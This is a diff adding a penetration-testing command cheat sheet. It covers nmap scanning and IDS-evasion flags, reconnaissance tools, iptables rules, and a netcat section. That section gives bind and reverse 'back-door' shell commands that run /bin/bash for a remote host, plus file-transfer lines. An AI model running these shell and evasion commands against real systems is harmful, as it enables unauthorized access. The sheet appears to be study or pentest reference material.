@@ -1,0 +1,96 @@
+Commands - Final
+
+-----------------------------------------------------------------------------------------
+
+Nmap -- 
+	# -sS (tcp syn scan)
+	# -sU (udp scan)
+	# --top-ports 1000 (scan top 1000 ports)
+	
+	# -sSV, -sUV (tcp/udp port and services enumeration scan)
+	# -O (operating system enumeration)
+	# -Pn (helps if ids/ips/isp is filtering scans
+	
+	# nmap -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.1.0/24 (Find open SMB shares)
+	
+	# -sA (Find out if a host/network is protected by a firewall)
+	# -F (FAST SCAN)
+	# -p (scan for specific ports)
+	
+	# -PA (tcp ACK scan, used when firewall is blocking standard ICMP pings)
+	# -PS (tcp SYN scan, used when firewall is blocking standard ICMP pings)
+	# -sS (Stealthy Scan)
+	# -f (The -f option causes the requested scan (including ping scans) to use tiny fragmented IP packets. Good for IDS/IPS sidestepping)
+	
+	TCP Null Scan to fool a firewall to generate a response
+	Does not set any bits (TCP flag header is 0) 
+	# nmap -sN 192.168.1.254
+	 
+	TCP Fin scan to check firewall
+	lets just the TCP FIN bit 
+	# nmap -sF 192.168.1.254
+	 
+	TCP Xmas scan to check firewall
+	Sets the FIN, PSH, and URG flags, lighting the packet up like a Christmas tree ##
+	# nmap -sX 192.168.1.254
+	
+	
+	
+-----------------------------------------------------------------------------------------
+
+theHarvester --
+	# theHarvester -d *domain* -b all (searches all social and web platforms)
+
+-----------------------------------------------------------------------------------------
+
+DnsEnum --
+	# dnsenum (enumerates dns information)
+
+-----------------------------------------------------------------------------------------
+
+Proxy Chains --
+	# proxychains nmap -ssV --top-ports 10 
+
+-----------------------------------------------------------------------------------------
+
+ICMP echo requests --
+	# fping -f 
+
+-----------------------------------------------------------------------------------------
+
+ike-scan --
+	# ike-scan *target* (attempts aggressive handshake)
+	# generate-transforms.sh | xargs --max-lines=8 ike-scan 10.0.0.0/24 (advanced IKE scanning)
+	ref ^^ <http://www.nta-monitor.com/wiki/index.php/Ike-scan_User_Guide> 
+
+-----------------------------------------------------------------------------------------
+
+IPtables --
+
+	# iptables -A INPUT -s 202.5.4.1 -j DROP (adds new rule to IP table)
+
+	# iptables-save > /root/my.active.firewall.rules (Saves rules in IP table)
+	# cat /root/my.active.firewall.rules (Check if rule saved)
+
+	# iptables -L -n -v --line-numbers (shows current IPtables)
+
+	# -L : List rules.
+	# -v : Display detailed information. This option makes the list command show the interface name, the rule options, and the TOS masks. The packet and byte counters are also listed, with the suffix ‘K’, ‘M’ or ‘G’ for 1000, 1,000,000 and 1,000,000,000 multipliers respectively.
+	# -n : Display IP address and port in numeric format. Do not use DNS to resolve names. This will speed up listing.
+	# --line-numbers : You can use line numbers to delete or insert new rules into the firewall.
+
+	# iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
+	# iptables -A INPUT -i eth1 -p icmp --icmp-type echo-request -j DROP
+
+https://www.cyberciti.biz/tips/linux-iptables-examples.html
+
+-----------------------------------------------------------------------------------------
+
+Netcat --
+							BACKDOOR
+	# nc -l -p [localport] -e /bin/bash (Listening back-door shell)
+	# nc [MyIPaddress] [listening port] -e /bin/bash (Reverse back-door shell)
+	
+							FILE TRANSFER
+	# nc -l -p [localport] > [outfile]  (Listen on [localport], store results in [outfile])
+	# nc -w3 [TargetIPAddr] [port] < [infile]  (Pushes file to TargetIPAddr)
